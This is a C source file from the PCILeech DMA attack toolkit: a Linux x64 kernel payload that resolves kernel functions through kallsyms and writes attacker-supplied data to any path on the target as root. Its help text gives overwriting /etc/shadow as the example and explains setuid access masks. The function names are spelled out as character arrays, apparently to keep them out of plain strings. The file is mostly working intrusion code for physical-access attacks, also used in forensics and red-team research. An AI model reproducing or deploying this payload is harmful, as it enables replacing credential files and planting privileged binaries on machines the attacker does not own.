// lx64_filepush.c : kernel code to push files to target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filepush.c
// ml64 lx64_common_a.asm /Felx64_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filepush.obj lx64_common.obj
// shellcode64.exe -o lx64_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \nLINUX X64 EDITION                                              \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \n* Files created will be created with root as owner/group and get\n  the access mask specified in the -0 parameter.               \n* Files overwritten will keep the access mask and owner/group. \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\shadow'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/shadow'                             \n  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!    \n         NB! linux file masks are ususally typed in octal -    \n         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)  \n         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)  \n         Example: '-0 0x1ff'                                   \n  -1   : run flag - set to non zero to push file.              \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\nBYTES WRITTEN : 0x%08X\n===============================================================\n"
// 

#include "lx64_common.h"

#define O_WRONLY        00000001
#define O_CREAT         00000100
#define O_TRUNC         00001000
#define O_LARGEFILE     00100000

typedef struct tdFN2 {
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_write;
	QWORD kernel_write;
	QWORD memcpy;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[5];
	CHAR str_filp_close[] = { 'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0 };
	CHAR str_filp_open[] = { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	CHAR str_vfs_write[] = { 'v', 'f', 's', '_', 'w', 'r', 'i', 't', 'e', 0 };
	CHAR str_kernel_write[] = { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'w', 'r', 'i', 't', 'e', 0 };
	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[0] = (QWORD)str_filp_close;
	NAMES[1] = (QWORD)str_filp_open;
	NAMES[2] = (QWORD)str_vfs_write;
	NAMES[3] = (QWORD)str_kernel_write;
	NAMES[4] = (QWORD)str_memcpy;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 5);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	QWORD hFile, qwOffset = 0;
	if(!pk->dataIn[1]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	hFile = SysVCall(fn2.filp_open, pk->dataInStr, O_WRONLY | O_CREAT | O_TRUNC | O_LARGEFILE, pk->dataIn[0]);
	if(hFile > 0xffffffff00000000) {
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	pk->dataOut[1] = SysVCall(
		fn2.kernel_write ? fn2.kernel_write : fn2.vfs_write,
		hFile,
		pk->DMAAddrVirtual + pk->dataInExtraOffset,
		pk->dataInExtraLength,
		&qwOffset
	);
	SysVCall(fn2.filp_close, hFile, NULL);
}